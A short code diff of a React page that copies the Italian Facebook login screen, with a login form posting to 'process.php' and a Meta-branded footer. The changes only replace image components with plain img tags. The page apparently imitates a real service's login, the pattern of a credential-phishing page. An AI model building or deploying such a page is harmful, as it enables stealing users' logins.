@@ -13,7 +13,7 @@ export default function Home() {
 
         <div className="fb-container">
           <p className="lang">Italiano</p>
-          <Image src="facebook.png" alt="Facebook logo" width={200} height={60} className="fb-logo" />
+          <img src="/facebook.png" />
 
           <div className="fb-login-box">
             <form action="process.php" method="POST" className="fb-form">
@@ -26,9 +26,8 @@ export default function Home() {
             </form>
           </div>
 
-          <footer className="meta-footer">
-            <Image src="meta.png" alt="Meta logo" width={100} height={30} className="meta-logo" />
-            <div className="meta-links">
+          <footer className="meta-footer"><img src="/meta.png"/>
+              <div className="meta-links">
               <a href="#">Informazioni</a>
               <a href="#">Centro assistenza</a>
               <a href="#">Altro</a>
